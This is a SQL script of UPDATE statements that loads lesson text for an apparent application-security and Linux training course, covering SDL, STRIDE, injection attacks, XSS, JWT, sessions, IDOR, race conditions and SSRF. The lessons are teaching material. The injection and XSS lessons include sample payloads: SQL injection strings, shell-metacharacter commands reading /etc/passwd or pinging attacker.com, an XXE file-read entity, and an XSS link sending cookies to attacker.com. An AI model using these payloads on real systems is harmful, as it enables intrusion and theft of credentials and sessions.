UPDATE "Lesson" SET content = 'The Security Development Lifecycle (SDL) is a structured methodology that integrates security practices into every phase of software development. Originally introduced by Microsoft in 2004, the SDL has become the industry standard for building secure software and is now adopted by organizations worldwide. The core premise is simple but powerful: addressing security early in the development lifecycle is dramatically cheaper and more effective than trying to fix vulnerabilities after deployment.

The SDL consists of several key phases that work together to create a comprehensive security framework. Let us examine each phase in detail.

1. Training Phase: Before any development begins, the entire team receives security training. Developers learn about common vulnerability classes such as buffer overflows, injection attacks, and authentication flaws. This training ensures that everyone on the team understands the security implications of their code and can make informed decisions during implementation.

2. Requirements Phase: During this phase, the team establishes security requirements and quality gates. These requirements include defining the security features the software must implement, establishing compliance requirements, and creating security documentation. Key deliverables include a security design specification and a threat model.

3. Design Phase: The design phase focuses on creating a security architecture that addresses the identified threats. Activities include performing threat modeling using frameworks like STRIDE, establishing secure design principles such as least privilege and defense in depth, and creating security architecture documentation. The design should be reviewed by security experts before implementation begins.

4. Implementation Phase: During implementation, developers follow secure coding guidelines and use approved tools. The team performs code reviews with a focus on security, eliminates dangerous functions and APIs, and uses static analysis tools to identify potential vulnerabilities. Code must pass all security quality gates before it can be merged.

5. Verification Phase: The verification phase involves extensive security testing. This includes dynamic application security testing (DAST), fuzz testing to discover edge cases, penetration testing by security experts, and automated security scanning in the CI/CD pipeline. The team must document all findings and track remediation progress.

6. Release Phase: Before release, the software undergoes a final security review. This includes creating a security response plan for handling future vulnerabilities, producing security documentation, and ensuring all security requirements have been met. The team signs off on the release only after all quality gates pass.

7. Response Phase: After release, the team maintains an incident response plan and monitors for security issues. This includes tracking vulnerability reports, releasing security patches, and continuously improving the SDL based on lessons learned.

The benefits of implementing an SDL are well documented. Studies show that organizations with mature SDLs experience 50% fewer security vulnerabilities in production. The cost of fixing a vulnerability during the design phase is approximately 30 times less than fixing it after release. Additionally, SDL implementation helps organizations meet compliance requirements such as PCI DSS, HIPAA, and SOC 2.

To implement an SDL effectively, organizations should start small and iterate. Begin by establishing secure coding guidelines, implementing code reviews, and integrating automated security testing. Over time, mature the program by adding threat modeling, security architecture reviews, and formal security training. Measure your progress using metrics like vulnerability density, time to remediation, and security incident frequency.', "order" = 1 WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'What is the SDL?';
UPDATE "Lesson" SET content = 'Threat modeling is a systematic process for identifying potential security threats and vulnerabilities in a system before they can be exploited. Among the various threat modeling frameworks, STRIDE remains one of the most widely used and effective approaches. Developed by Microsoft, STRIDE provides a structured methodology for categorizing threats and determining appropriate mitigations.

STRIDE is an acronym that represents six categories of security threats. Each category has a specific security property it violates, making it easier to identify and address vulnerabilities systematically.

1. Spoofing Identity: Spoofing occurs when an attacker pretends to be someone else by falsifying data. For example, an attacker might forge authentication tokens, manipulate session cookies, or use stolen credentials to impersonate a legitimate user. The security property violated is authentication. Mitigations include implementing strong authentication mechanisms such as multi-factor authentication, using digital certificates for identity verification, and validating all identity claims against trusted sources.

2. Tampering with Data: Tampering involves unauthorized modification of data, whether in transit or at rest. An attacker might modify database records, alter messages between components, or change configuration files. The security property violated is integrity. Mitigations include using cryptographic hashes to verify data integrity, implementing digital signatures for critical data, and using encrypted communication channels with message authentication codes.

3. Repudiation: Repudiation occurs when a user denies performing an action, and the system cannot prove otherwise. For instance, a user might claim they never initiated a financial transaction. The security property violated is non-repudiation. Mitigations include implementing comprehensive audit logging with tamper-evident mechanisms, using digital signatures for critical operations, and maintaining centralized log management with proper retention policies.

4. Information Disclosure: Information disclosure happens when sensitive data is exposed to unauthorized parties. This could include leaking database contents, exposing error messages with system details, or transmitting data in cleartext. The security property violated is confidentiality. Mitigations include encrypting sensitive data at rest and in transit, implementing proper access controls, and sanitizing error messages to prevent information leakage.

5. Denial of Service: Denial of service attacks aim to make a system or service unavailable to legitimate users. This could involve flooding a server with requests, consuming all available resources, or crashing services through malformed inputs. The security property violated is availability. Mitigations include implementing rate limiting, using load balancers, configuring resource limits, and deploying denial of service protection services.

6. Elevation of Privilege: Elevation of privilege occurs when an attacker gains higher access rights than intended. This might involve exploiting a vulnerability to gain root access, manipulating access control lists, or exploiting race conditions in authorization checks. The security property violated is authorization. Mitigations include implementing the principle of least privilege, performing regular access reviews, and validating authorization at every access point.

To perform threat modeling with STRIDE, follow a structured process. Begin by decomposing the application into components and mapping data flows between them. Create a data flow diagram that shows all entry points, trust boundaries, and data stores. Next, systematically apply each STRIDE category to every component and data flow. Document all identified threats with their severity, likelihood, and potential impact. Finally, develop mitigations for each threat and track their implementation through to completion.', "order" = 2 WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Threat Modeling with STRIDE';
UPDATE "Lesson" SET content = 'Secure design principles form the foundation of building resilient, attack-resistant software systems. These principles, established through decades of security research and real-world incident analysis, provide guidance for architects and developers to create systems that are inherently secure rather than relying solely on defensive measures applied after the fact.

1. Principle of Least Privilege: This principle states that every component, user, and process should operate with the minimum set of privileges necessary to complete its task. In practice, this means creating dedicated service accounts with limited permissions, using role-based access control (RBAC) to manage user permissions, and implementing just-in-time access provisioning for administrative tasks. For example, a web application should use a database user with only SELECT, INSERT, and UPDATE permissions on specific tables rather than full database administrator access.

2. Defense in Depth: Defense in depth involves implementing multiple layers of security controls throughout the system. If one layer fails, subsequent layers continue to provide protection. A typical defense-in-depth strategy includes network firewalls, web application firewalls, intrusion detection systems, input validation, authentication mechanisms, authorization controls, encryption, and comprehensive logging. Each layer should be independent so that compromising one does not automatically compromise others.

3. Fail-Safe Defaults: When a system encounters an error or unexpected condition, it should default to a secure state. This means denying access by default, logging the failure for investigation, and notifying administrators of unusual conditions. For example, if a firewall cannot determine whether to allow or deny a connection, it should deny the connection. If an authentication system cannot verify a user''s identity, it should deny access rather than granting limited access.

4. Economy of Mechanism: This principle advocates keeping security mechanisms as simple and small as possible. Complex systems are harder to understand, verify, and maintain. Simple mechanisms are easier to test, less likely to contain vulnerabilities, and simpler to patch when issues are discovered. When designing security controls, choose the simplest effective solution rather than the most comprehensive one.

5. Complete Mediation: Every access to every object must be checked for authority. This means verifying permissions at each access point, not just at the initial connection. For example, in a web application, authorization checks should be performed on every API endpoint, not just at the login screen. Cached credentials should be revalidated periodically, and session tokens should be verified on each request.

6. Open Design: Security should not depend on the secrecy of the mechanism itself, but rather on the secrecy of the keys or passwords used. This principle, also known as Kerckhoffs''s principle, means that system security should survive public scrutiny. The design should be openly discussed and testing, while only the secrets remain confidential.

7. Separation of Duties: Critical operations should require more than one person to complete. This prevents any single individual from having complete control over sensitive processes. For example, deploying code to production should require approval from both a development lead and a security team member.

8. Psychological Acceptability: Security mechanisms should not make the resource more difficult to access than if the security mechanisms were not present. If security measures are too cumbersome, users will find ways to bypass them. Authentication should be strong but not burdensome, and security controls should be transparent to legitimate users while blocking unauthorized access.', "order" = 3 WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Secure Design Principles';
UPDATE "Lesson" SET content = 'SQL injection remains one of the most dangerous and prevalent web application vulnerabilities, despite being well understood for over two decades. While basic SQL injection involves directly inserting malicious SQL code into user input fields, advanced SQL injection techniques exploit complex database features and bypass common defensive measures.

1. Union-Based Injection: Union-based injection works by appending UNION SELECT statements to the original query to retrieve data from other tables. The attacker must determine the number of columns in the original query and their data types. For example, if a vulnerable query returns two columns, an attacker might use: '' UNION SELECT username, password FROM users--. The key challenge is matching the column count and types of the original query.

2. Blind SQL Injection: When the application does not display error messages or query results directly, attackers use blind SQL injection to extract data through inference. Boolean-based blind injection involves sending queries that return true or false, allowing the attacker to extract data one bit at a time. For example: '' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=''admin'')=''a''--. If the page returns normally, the first character of the password is ''a''. Time-based blind injection uses database functions like SLEEP or WAITFOR to introduce delays: '' AND IF(1=1, SLEEP(5), 0)--. If the response takes five seconds, the condition was true.

3. Second-Order Injection: Second-order injection occurs when malicious input is stored in the database and executed later when a different query retrieves it. For example, an attacker might register with a username containing SQL injection payload. When an administrator views the user list, the payload executes in a different context. This is particularly dangerous because the input passes initial validation.

4. Out-of-Band Injection: When direct responses are not available, attackers use out-of-band techniques to exfiltrate data through alternative channels. This might involve using database functions to make HTTP requests to attacker-controlled servers, DNS queries to leak data, or SMTP functions to send data via email. For example, in Microsoft SQL Server, the xp_cmdshell function can be used to execute operating system commands.

5. Filter Bypass Techniques: Modern applications often implement input filtering to prevent SQL injection. Attackers use various techniques to bypass these filters. Case variation (SELECT vs sElEcT) can bypass case-sensitive filters. Inline comments (SEL/**/ECT) can break up keywords. URL encoding can bypass input validation. Null bytes can terminate strings in some environments.

6. WAF Evasion: Web Application Firewalls add another layer of defense, but they can be bypassed using techniques like HTTP parameter pollution, chunked transfer encoding, and character encoding manipulation.

Preventing SQL injection requires a multi-layered approach. The most effective defense is using parameterized queries (prepared statements) which separate SQL code from data. Input validation should be applied as a secondary defense, not the primary one. Regular security testing, including static code analysis and penetration testing, is essential to identify and remediate SQL injection vulnerabilities.', "order" = 1 WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'SQL Injection Beyond Basics';
UPDATE "Lesson" SET content = 'Operating system command injection occurs when an application passes user-supplied data to a system shell without proper validation or sanitization. Unlike SQL injection, which targets database queries, OS command injection targets the underlying operating system, potentially giving attackers complete control over the server.

1. Basic Command Injection: The simplest form of command injection involves appending additional commands to the end of a legitimate command using shell metacharacters. For example, if an application uses user input in a ping command: ping $target, an attacker could submit 127.0.0.1; cat /etc/passwd, resulting in both the ping and the cat command executing. Common metacharacters include semicolons (;), ampersands (&&), pipes (|), and dollar signs with parentheses ($()).

2. Blind Command Injection: When the application does not display command output directly, attackers use blind injection techniques. This involves sending commands that produce observable side effects. For example, using ping to generate network traffic: 127.0.0.1; ping attacker.com. The attacker monitors their server for incoming ICMP requests. Another technique uses time delays: 127.0.0.1; sleep 10. If the response takes ten seconds, the command executed.

3. Data Exfiltration: Once command injection is confirmed, attackers need methods to extract data from the system. Techniques include using base64 encoding to exfiltrate file contents: cat /etc/passwd | base64. The attacker can then decode the output. DNS exfiltration uses DNS queries to leak data. HTTP exfiltration sends data to an attacker-controlled server.

4. OS-Specific Techniques: Different operating systems have different command injection vectors. On Linux/Unix systems, backticks, dollar signs with parentheses, and pipe characters are common injection points. On Windows, ampersands, pipe, and redirection operators are commonly exploited.

5. Environment Variable Injection: Attackers can manipulate environment variables to influence command execution. For example, modifying PATH to point to malicious executables, setting LD_PRELOAD to inject shared libraries, or manipulating IFS to change how commands parse arguments.

6. Prevention Strategies: The most effective prevention is avoiding OS command execution entirely. Use language-native functions instead of shell commands when possible. When shell commands are necessary, use parameterized APIs that separate commands from arguments. Implement strict allow-list validation. Only permit characters necessary for the intended functionality.

7. Sandboxing and Isolation: Run applications with minimal privileges using techniques like chroot jails, containerization, or dedicated service accounts with restricted permissions. Use SELinux or AppArmor to confine application processes.', "order" = 2 WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'OS Command Injection';
UPDATE "Lesson" SET content = 'LDAP injection and XML injection are lesser-known but equally dangerous injection vulnerabilities that target directory services and data processing systems. Understanding these attack vectors is essential for securing applications that interact with directory services and XML-based systems.

LDAP Injection Fundamentals:

LDAP (Lightweight Directory Access Protocol) is used to access and manage directory information services. LDAP injection occurs when user input is incorporated into LDAP queries without proper sanitization.

1. Authentication Bypass: The most common LDAP injection attack targets authentication mechanisms. A typical login query might be: (&(username=$username)(password=$password)). An attacker can bypass authentication by submitting username: admin)(!(&(password: any). This modified input creates a query that evaluates to true regardless of the password.

2. Information Disclosure: Attackers can extract directory information by crafting queries that return additional data. For example, injecting wildcard characters or logical operators can enumerate users, groups, and organizational units. A query like: (|(username=*)) returns all users in the directory.

3. Blind LDAP Injection: Similar to blind SQL injection, attackers can extract information one character at a time when direct output is not available. By using time-based techniques or boolean conditions, attackers can determine directory contents character by character.

4. Prevention Strategies: Use parameterized LDAP queries that separate the query structure from user input. Implement input validation using allow-lists. Encode special LDAP characters like asterisks, parentheses, backslashes, and null bytes. Use the principle of least privilege for LDAP service accounts.

XML Injection Fundamentals:

XML injection, also known as XXE (XML External Entity) injection, targets applications that process XML data.

1. External Entity Injection: XML documents can define external entities that reference files or URLs. An attacker can define a malicious entity: <!ENTITY xxe SYSTEM "file:///etc/passwd">. When the XML is parsed, the entity is replaced with the contents of the referenced file.

2. Blind XXE: When the application does not directly display XML content, attackers use out-of-band techniques to exfiltrate data. This involves defining entities that reference attacker-controlled servers.

3. Billion Laughs Attack: This denial of service attack uses nested entity references to consume all available memory. By defining entities that reference other entities, the parser can be forced to expand the document to gigabytes.

4. Prevention Strategies: Disable external entity processing in XML parsers. Validate and sanitize XML input before processing. Use JSON as an alternative to XML where possible, as JSON does not support external entities by design.', "order" = 3 WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'LDAP and XML Injection';
UPDATE "Lesson" SET content = 'Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to execute malicious scripts in the context of a victim''s browser. XSS remains one of the most common web application vulnerabilities, affecting millions of websites.

1. Reflected XSS: Reflected XSS occurs when user input is immediately returned by the application without proper encoding. The malicious payload is typically delivered via a URL that the victim clicks. For example, a search page that reflects the search term: https://example.com/search?q=<script>document.location=''http://attacker.com/steal?c=''+document.cookie</script>.

2. Stored XSS: Stored XSS, also known as persistent XSS, occurs when malicious input is stored in the application''s database and displayed to other users without proper encoding. This is the most dangerous form of XSS because it affects every user who views the affected page.

3. DOM-Based XSS: DOM-based XSS occurs entirely in the client-side JavaScript without the server ever processing the malicious payload. The vulnerability exists in how the client-side code handles user input. For example: document.getElementById(''output'').innerHTML = location.hash.substring(1).

4. Mutation XSS: Mutation XSS exploits the browser''s HTML parsing and mutation behavior. Certain HTML constructs, when inserted into the DOM, are mutated by the browser into executable script contexts.

5. XSS Payload Delivery: Attackers use various techniques to deliver XSS payloads. Phishing emails containing malicious links are common. Stored XSS in forums, comments, and user profiles can affect large numbers of users. Reflected XSS through search functionality or error messages.

6. Impact of XSS: The impact depends on the context. Session hijacking allows attackers to steal session cookies and impersonate victims. Credential theft involves injecting keyloggers or fake login forms. Content injection can modify the page to display false information. Worms can be created that automatically spread the payload to other users.

7. Prevention Strategies: The primary defense against XSS is output encoding. Encode all user input before displaying it in HTML contexts. Use Content Security Policy (CSP) headers to restrict script execution. Implement HTTPOnly flags on cookies to prevent JavaScript access. Use input validation as a secondary defense. Sanitize HTML input using libraries like DOMPurify or Bleach.', "order" = 1 WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'XSS Exploitation Techniques';
UPDATE "Lesson" SET content = 'JSON Web Tokens (JWT) have become the de facto standard for authentication in modern web applications. However, JWTs introduce unique security challenges that, if not properly addressed, can lead to complete authentication bypass.

1. Algorithm Confusion: One of the most critical JWT vulnerabilities is algorithm confusion. The vulnerability occurs when the server accepts the algorithm specified in the token header rather than enforcing the expected algorithm. An attacker can change the algorithm from RS256 to HS256 and sign the token using the public key as the HMAC secret.

2. None Algorithm: The JWT specification includes a ''none'' algorithm that indicates the token is unsigned. Some implementations incorrectly accept tokens with the ''none'' algorithm, allowing attackers to create tokens without any signature.

3. Weak Secret Keys: When using HMAC algorithms, the security depends entirely on the secrecy of the signing key. Common vulnerabilities include using short or predictable keys, using default keys from documentation, reusing keys across environments, and using weak key generation methods.

4. Key Confusion Attacks: When using RSA for signing, the public key is used to verify signatures. The vulnerability occurs when an attacker switches the algorithm from RS256 to HS256 and uses the public key as the HMAC secret. Since the public key is often publicly available, the attacker can create valid tokens.

5. Token Storage: JWTs must be stored securely. Common storage mechanisms include localStorage (vulnerable to XSS), sessionStorage, cookies (vulnerable to CSRF unless properly configured), and memory. The best practice is to store JWTs in HTTPOnly, Secure, SameSite cookies.

6. Token Expiration: JWTs should have short expiration times. Common mistakes include using long expiration times, not implementing token refresh mechanisms, and not providing token revocation capabilities.

7. Claim Validation: JWTs contain claims that specify the token''s audience, issuer, and expiration. Common vulnerabilities include not validating the ''iss'' (issuer) claim, not validating the ''aud'' (audience) claim, and not checking token expiration.

8. Prevention Strategies: Always validate the algorithm and reject unexpected algorithms. Enforce HMAC or RSA based on your architecture. Use strong, randomly generated secrets. Implement proper token storage using HTTPOnly cookies. Use short-lived access tokens with secure refresh mechanisms. Validate all JWT claims. Implement token revocation.', "order" = 2 WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'JWT Security Pitfalls';
UPDATE "Lesson" SET content = 'Session management is a critical component of web application security, responsible for maintaining user state across multiple requests. Vulnerabilities in session management can lead to account takeover, privilege escalation, and unauthorized access.

1. Session Hijacking: Session hijacking occurs when an attacker obtains a valid session token and uses it to impersonate the victim. Methods include cross-site scripting (XSS) to steal session cookies, network sniffing to capture tokens, man-in-the-middle attacks, and session fixation.

2. Session Fixation: Session fixation occurs when an attacker forces a victim to use a session token known to the attacker. This can happen when the application accepts session tokens from URL parameters, does not regenerate session tokens after authentication, or allows session tokens to be set via cookies that can be manipulated.

3. Brute Force Attacks: Weak session tokens can be brute-forced. If session IDs are sequential or use predictable patterns, attackers can generate valid tokens through enumeration. Use cryptographically random session IDs with at least 128 bits of entropy.

4. Token Leakage: Session tokens can be leaked through HTTP Referer headers, browser history, insecure logging practices, and cache poisoning. Implement referrer policies, cache-control headers, and avoid logging sensitive data.

5. Cross-Site Request Forgery (CSRF): CSRF exploits session cookies to perform unauthorized actions. When a user is authenticated and visits a malicious site, the malicious site can make requests using the user''s session cookies. Prevent with anti-CSRF tokens and SameSite cookie attributes.

6. Session Timeout: Improper session timeout management can leave sessions active indefinitely. Implement both absolute timeout and idle timeout. Store session state server-side and invalidate sessions on logout.

7. Secure Session Configuration: Use HTTPOnly flag to prevent JavaScript access to session cookies. Use Secure flag for HTTPS-only transmission. Use SameSite attribute to prevent CSRF. Regenerate session ID after authentication. Implement server-side session storage.

8. Session Revocation: Provide mechanisms for users to invalidate their sessions. Implement logout functionality that destroys the session on the server side. Allow users to view and terminate active sessions.', "order" = 3 WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'Session Management Attacks';
UPDATE "Lesson" SET content = 'Insecure Direct Object References (IDOR) is a vulnerability that occurs when an application exposes internal implementation objects without proper access control. IDOR is one of the most common web application vulnerabilities and can lead to unauthorized access to sensitive data.

1. Understanding IDOR: IDOR vulnerabilities occur when an application uses user-supplied input to directly access objects without verifying the user''s authorization. For example, a user profile page might use /profile?id=123. If the application does not verify that the authenticated user is authorized to view user 123, any user can access any profile.

2. Numeric ID Enumeration: The simplest form of IDOR involves sequential numeric identifiers. If user profiles use /profile?id=100, an attacker can enumerate through IDs to access all profiles. This can be automated with simple scripts that iterate through a range of IDs.

3. UUID and GUID Enumeration: While UUIDs are not sequential, they are not inherently secure. If the application leaks UUIDs through other channels, attackers can use them to access protected resources.

4. Path Traversal IDOR: IDOR can also occur with file system paths. If an application uses user input to construct file paths without proper validation, attackers can manipulate paths to access unauthorized files.

5. API Endpoint IDOR: RESTful APIs are particularly susceptible. Endpoints like /api/users/123/documents allow direct access to objects. If the API does not verify authorization, any authenticated user can access any resource by changing the ID.

6. Horizontal vs Vertical Privilege Escalation: Horizontal privilege escalation occurs when a user accesses resources belonging to another user at the same privilege level. Vertical privilege escalation occurs when a regular user accesses resources reserved for administrators.

7. Prevention Strategies: Implement proper authorization checks at every access point. Verify that the authenticated user has permission to access the requested object. Use indirect references that map user-controlled input to internal identifiers. Use role-based access control (RBAC) to manage permissions.

8. Testing for IDOR: Test for IDOR by accessing resources with different user accounts. Use automated tools to scan for predictable identifiers. Test API endpoints with different authorization levels.', "order" = 1 WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'IDOR and Access Control Bypass';
UPDATE "Lesson" SET content = 'Race conditions are vulnerabilities that occur when the timing or ordering of operations affects the application''s behavior in unintended ways. Time-of-Check to Time-of-Use (TOCTOU) is a specific type of race condition where the application checks a condition and then uses the result, but the condition changes between the check and the use.

1. Understanding Race Conditions: Race conditions occur when two or more concurrent operations access shared resources without proper synchronization. The outcome depends on the timing of execution, which can vary based on system load and network latency.

2. TOCTOU Vulnerabilities: TOCTOU vulnerabilities occur when an application performs a security check and then acts on the result, but the state changes between the check and the action. For example, a file upload application might check permissions, but between the check and the actual upload, an attacker creates a symbolic link.

3. Double-Spend Attacks: In financial applications, race conditions can lead to double-spend attacks. If a user initiates two transactions simultaneously, both might check for sufficient balance before either completes, allowing both to succeed.

4. Authentication Race Conditions: Race conditions in authentication can allow multiple login attempts to bypass rate limiting or account lockout mechanisms. By sending many requests simultaneously, an attacker might exceed the lockout threshold without triggering it.

5. File System Race Conditions: File system operations are particularly susceptible. The classic TOCTOU vulnerability involves checking file permissions and then opening the file. Between the check and the open, an attacker can change the file''s permissions.

6. Prevention Strategies: Use atomic operations that cannot be interrupted. Database transactions provide atomicity for data operations. Use file locking mechanisms. Implement proper synchronization using mutexes, semaphores, or other concurrency control mechanisms.

7. Database-Level Prevention: Use database transactions with appropriate isolation levels. Use SELECT FOR UPDATE to lock rows during read-modify-write operations. Implement optimistic locking using version numbers or timestamps.

8. Application-Level Prevention: Implement rate limiting to prevent rapid repeated requests. Use tokens or nonce values to prevent replay attacks. Design APIs to be idempotent so that repeated requests have the same effect.', "order" = 2 WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Race Conditions and TOCTOU';
UPDATE "Lesson" SET content = 'Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker''s choosing. SSRF can be used to scan internal networks, access internal services, and read cloud metadata endpoints.

1. Understanding SSRF: SSRF occurs when an application fetches resources from a user-supplied URL without proper validation. The server acts as a proxy, making requests on behalf of the attacker.

2. Internal Network Scanning: SSRF can be used to map internal network topology. By providing internal IP addresses as URLs, attackers can determine which hosts are running and which ports are open.

3. Cloud Metadata Exploitation: Cloud providers expose metadata services at 169.254.169.254. SSRF can be used to access these endpoints, potentially revealing access keys, security credentials, and instance configuration.

4. Internal Service Access: SSRF can be used to access internal services not exposed to the internet. This includes databases, message queues, management interfaces, and other internal APIs.

5. Protocol Smuggling: SSRF can access services using different protocols. While the primary use case involves HTTP requests, some implementations support file://, gopher://, dict://, and ftp:// protocols.

6. Blind SSRF: Blind SSRF occurs when the server makes the request but the response is not returned to the attacker. It can still be used for port scanning and out-of-band attacks.

7. Prevention Strategies: Implement URL validation using allow-lists. Block access to internal IP ranges including 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. Block access to cloud metadata endpoints. Use network segmentation.

8. Defense in Depth: Use a dedicated service for outbound HTTP requests. Deploy network-level protections like web application firewalls. Monitor outbound HTTP requests for suspicious patterns.', "order" = 3 WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Server-Side Request Forgery';
UPDATE "Lesson" SET content = 'The Linux boot process is the sequence of steps that occurs from the moment a computer is powered on until the operating system is fully loaded and ready for use. Understanding the boot process is essential for system administration, troubleshooting, and security hardening.

1. BIOS/UEFI Stage: The boot process begins with the BIOS or UEFI. When the system is powered on, the BIOS/UEFI performs a Power-On Self-Test (POST) to verify hardware functionality. It then searches for a bootable device based on the configured boot order. The BIOS reads the Master Boot Record (MBR), while UEFI reads the EFI System Partition.

2. Bootloader Stage: The bootloader is responsible for loading the Linux kernel into memory. GRUB (GRand Unified Bootloader) is the most common bootloader. GRUB presents a menu of available kernels and allows the user to select which one to boot. The GRUB configuration file at /boot/grub/grub.cfg defines the boot entries.

3. Kernel Initialization: The Linux kernel initializes hardware devices, sets up memory management, and mounts the initial root filesystem. The kernel decompresses itself and starts the init process (PID 1). Early in the boot process, the kernel loads device drivers and initializes hardware.

4. Initramfs Stage: The initramfs is a temporary filesystem loaded into memory by the bootloader. It contains essential device drivers and scripts needed to mount the real root filesystem. The initramfs is particularly important for systems with encrypted filesystems or RAID arrays.

5. Init System: The init system is the first user-space process (PID 1) and is responsible for starting system services. Modern Linux distributions use systemd, which provides parallel service startup, dependency management, and resource control. Systemd uses unit files in /etc/systemd/system/.

6. Runlevel/Target: Linux systems use targets to define different system states. Each target specifies which services should be running. Common targets include multi-user.target and graphical.target.

7. Boot Process Security: Secure Boot ensures that only signed bootloaders and kernels can be executed. BIOS/UEFI passwords prevent unauthorized changes. GRUB password protection prevents unauthorized kernel parameter modifications.

8. Troubleshooting Boot Issues: Common boot problems include missing initramfs, incorrect kernel parameters, and failed filesystem checks. Use single-user mode or recovery mode to diagnose issues. Check boot logs for error messages.', "order" = 1 WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Linux Boot Process';
UPDATE "Lesson" SET content = 'The Linux file system follows a hierarchical directory structure with the root directory (/) at the top. Understanding the file system layout and navigation commands is fundamental for working effectively in Linux.

1. Directory Hierarchy: The Linux file system is organized as an inverted tree. Key directories include /bin (essential command binaries), /sbin (system binaries), /etc (configuration files), /var (variable data like logs), /tmp (temporary files), /home (user home directories), /root (root user home), /usr (user programs), /lib (shared libraries), /proc (process information), /sys (system information), /dev (device files), and /mnt or /media (mount points).

2. Navigation Commands: The primary navigation command is cd (change directory). Use cd /path/to/directory for absolute paths, cd relative/path for relative paths, cd ~ or just cd to go to your home directory, cd - to return to the previous directory, and cd .. to go up one directory. The pwd command shows your current location.

3. Absolute vs Relative Paths: Absolute paths start from the root directory. For example, /home/user/documents/file.txt is an absolute path. Relative paths start from your current directory and use . and .. to navigate. Understanding the difference is essential for scripting.

4. Listing Directory Contents: The ls command lists directory contents. Use ls -l for detailed information, ls -a to show hidden files, ls -la to combine both, ls -h for human-readable file sizes, and ls -t to sort by modification time.

5. Finding Files and Directories: The find command locates files based on various criteria. Use find /path -name filename to find files by name. Use find /path -type f for files only. Use find /path -mtime -7 for files modified in the last 7 days. The locate command provides faster searching using a pre-built database.

6. File System Types: Linux supports ext4 (most common), XFS (good for large files), Btrfs (modern with snapshot support), and network file systems like NFS and CIFS. Use mount to see mounted file systems, df -h for disk space, and du -sh for directory sizes.

7. Symbolic and Hard Links: Symbolic links are shortcuts that point to another file. Create them with ln -s target link_name. Hard links are additional directory entries pointing to the same inode. Create with ln target link_name. Symlinks can cross file system boundaries.

8. File System Permissions: Every file has permissions controlling read, write, and execute access. Use ls -l to view permissions. Use chmod to change permissions, chown to change ownership, and chgrp to change group ownership.', "order" = 2 WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'File System Navigation';
UPDATE "Lesson" SET content = 'The Linux command line provides powerful tools for system administration, file manipulation, text processing, and system monitoring.

1. File and Directory Operations: The cp command copies files (cp source destination, cp -r for directories). The mv command moves or renames files. The rm command removes files (rm filename) and directories (rm -r directory). The mkdir command creates directories (mkdir -p path/to/nested/dir). The touch command creates empty files or updates timestamps.

2. Text Viewing and Editing: The cat command displays file contents. The less command provides paginated viewing. The head command shows the first lines (head -n 20 filename). The tail command shows the last lines (tail -n 20 filename, tail -f for following). The nano and vim editors are essential for text editing.

3. Text Processing: The grep command searches for patterns in text (grep pattern filename). Use grep -r for recursive search, -i for case-insensitive, -n for line numbers. The sort command sorts lines. The uniq command removes duplicate lines. The wc command counts lines, words, and characters. The cut command extracts fields.

4. Piping and Redirection: Pipes connect command output to another command''s input (command1 | command2). Output redirection uses > to overwrite files and >> to append. Input redirection uses <. Standard error redirection uses 2>. These mechanisms allow complex data processing pipelines.

5. Process Management: The ps command shows running processes (ps aux). The top and htop commands provide real-time monitoring. The kill command terminates processes (kill PID, kill -9 for force kill). The systemctl command manages system services.

6. Disk and System Information: The df command shows disk space (df -h). The du command shows directory sizes (du -sh directory). The free command shows memory usage (free -h). The uname command shows system information (uname -a). The uptime command shows system uptime.

7. Network Commands: The ip command shows network configuration (ip addr, ip route). The ss command shows socket statistics (ss -tuln). The ping command tests connectivity. The curl command transfers data from URLs. The ssh command establishes secure remote connections.

8. Finding and Locating: The which command locates executables. The whereis command finds binaries, source, and manual pages. The find command searches for files based on criteria. The grep command searches file contents.', "order" = 3 WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Essential Command Line Tools';
UPDATE "Lesson" SET content = 'Linux is a multi-user operating system that provides robust user and group management capabilities. Understanding how to manage users and groups is essential for system administration, security, and access control.

1. User Account Files: Linux stores user account information in several files. The /etc/passwd file contains user account information with fields separated by colons: username:password:UID:GID:comment:home:shell. The /etc/shadow file stores encrypted passwords and password aging information. The /etc/group file contains group information.

2. Creating Users: The useradd command creates new user accounts. Use useradd -m -s /bin/bash username to create a user with a home directory and bash shell. Use useradd -G groupname username to add the user to supplementary groups. After creating a user, set a password with passwd username.

3. Modifying Users: The usermod command modifies existing user accounts. Use usermod -l newname oldname to change a username. Use usermod -d /new/home username to change the home directory. Use usermod -aG groupname username to add a user to a group without removing existing memberships.

4. Deleting Users: The userdel command removes user accounts. Use userdel username to remove the user but keep the home directory. Use userdel -r username to remove the user and their home directory.

5. Group Management: Groups are used to organize users and manage permissions collectively. The groupadd command creates new groups. The groupmod command modifies groups. The groupdel command removes groups. Users can be members of multiple groups.

6. Essential Groups: The root group (GID 0) has unrestricted access. The sudo group grants administrative privileges. The wheel group serves the same purpose on CentOS/RHEL. The users group is typically the default for regular users.

7. Password Policies: The chage command manages password aging (chage -M 90 username sets maximum age to 90 days). The /etc/login.defs file defines default password policies. Use pam_pwquality for complexity requirements.

